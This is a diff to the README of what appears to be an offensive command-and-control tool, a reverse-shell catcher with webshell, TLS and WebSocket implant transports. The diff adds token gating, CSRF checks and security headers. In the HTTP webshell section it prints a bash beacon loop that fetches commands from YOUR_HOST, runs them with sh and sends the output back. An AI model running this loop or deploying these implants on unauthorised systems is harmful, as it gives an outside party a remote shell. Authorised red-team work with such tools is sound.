@@ -12,7 +12,7 @@ A single-host, multi-transport reverse-shell catcher with a browser dashboard.
   - TLS reverse-shell listener
   - HTTP webshell beacon transport
   - multiplexed WebSocket/protobuf implant protocol with a Go client
-- **Dashboard:** live session list with a full PTY terminal (resize + mouse support), one-click offline-session cleanup, and a live in-memory event log.
+- **Dashboard:** live session list with a full PTY terminal (resize + mouse support), one-click offline-session cleanup, a live in-memory event log, copyable payload examples, and a BadUSB / DuckyScript generator.
 - **Auth:** session-cookie login; protects the dashboard, REST API, and browser-facing WebSocket endpoints.
 - **Build panel:** cross-compile the Go mux client from the dashboard with the server URL baked in — supports linux/darwin/windows × amd64/arm64, plus armv7 (Luckfox/Shark Jack) and mipsle soft-float (MT7628).
 
@@ -65,6 +65,7 @@ auto-generates a self-signed cert on first start using the bundled `openssl`.
 | `AUTH_USER`         |         | **Required.** Dashboard/REST/WS login username    |
 | `AUTH_PASS`         |         | **Required.** Dashboard/REST/WS login password    |
 | `AUTH_SECRET`       | random  | Pin session cookie secret across restarts        |
+| `BUILD_TOKEN`       |         | Shared token for `/mux`, `/dl`, and `/webshell`  |
 | `SCROLLBACK_BYTES`  | 1 MB    | Per-session in-memory scrollback cap             |
 | `WEBSHELL_POLL_MS`  | 25000   | Long-poll hold time                              |
 | `WEBSHELL_TIMEOUT`  | 30000   | Idle timeout before a webshell beacon is dead     |
@@ -90,14 +91,16 @@ it if desired.
 
 ### HTTP webshell
 
-For firewalled targets that can only make outbound HTTP requests:
+For firewalled targets that can only make outbound HTTP requests. The webshell
+endpoints require the same `BUILD_TOKEN` used by `/mux` and `/dl`:
 
 ```bash
-H=http://YOUR_HOST:8080; ID=$(curl -s $H/webshell/register)
+H=http://YOUR_HOST:8080; T=YOUR_BUILD_TOKEN
+ID=$(curl -s "$H/webshell/register?token=$T")
 while :; do
-  C=$(curl -s $H/webshell/$ID/poll)
+  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")
   [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)
-  curl -s --data-binary "$O" $H/webshell/$ID/output
+  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"
 done
 ```
 
@@ -169,6 +172,9 @@ Windows PTY is not included in this build.
 | `/api/hosts/:id/shells`          | POST   | Ask host to open a new PTY shell         |
 | `/api/log`                       | GET    | In-memory event-log snapshot (`?since=ts`)
 
+All mutating endpoints (`POST`, `DELETE`, etc.) require the `X-CSRF-Token`
+header to match the `rsl_csrf` cookie issued at login.
+
 ## WebSocket endpoints
 
 - `/api/ws/sessions` — JSON event stream for the session/host list
@@ -184,10 +190,14 @@ listener ports and (optionally) the webshell HTTP path should be reachable by
 targets.
 
 When `AUTH_USER` / `AUTH_PASS` are set, everything operator-facing is gated by
-a signed `rsl_session` cookie issued at `/login`:
+a signed `rsl_session` cookie issued at `/login`. The cookie is `HttpOnly` and
+`SameSite=Strict`. Login also sets a non-`HttpOnly` `rsl_csrf` cookie; mutating
+REST methods require the value in an `X-CSRF-Token` header.
+
+Protected surfaces:
 
 - the dashboard and static assets,
-- all `/api/*` REST routes,
+- all `/api/*` REST routes (CSRF-protected for `POST`/`DELETE`/etc.),
 - the browser WebSocket endpoints `/api/ws/sessions`, `/api/ws/session/:id`,
   and `/api/ws/log` (express-ws upgrades bypass HTTP middleware, so each
   handler re-checks the cookie and closes the socket with `1008` if it is
@@ -196,10 +206,17 @@ a signed `rsl_session` cookie issued at `/login`:
 `AUTH_USER` / `AUTH_PASS` are required — the server refuses to start without
 them.
 
-`/webshell/*` and `/mux` are deliberately unauthenticated — implants are dumb
-loops on the target and cannot carry operator credentials. The raw TCP and
-TLS reverse-shell listeners are unauthenticated by definition for the same
-reason.
+`/mux`, `/dl`, and `/webshell` are gated by the shared `BUILD_TOKEN` when it is
+set — implants carry this token because they cannot use operator session
+cookies. `/webshell/register` accepts the token via `?token=` or the
+`X-RSL-Token` header; `/webshell/:id/poll` and `/webshell/:id/output` require
+it on every request. The raw TCP and TLS reverse-shell listeners are
+unauthenticated by definition.
+
+The server also sets `X-Content-Type-Options`, `X-Frame-Options`,
+`Referrer-Policy`, and a `Content-Security-Policy` on every response. HSTS is
+added only when the request is detected as HTTPS (e.g., behind an HTTPS reverse
+proxy).
 
 ## Development
 
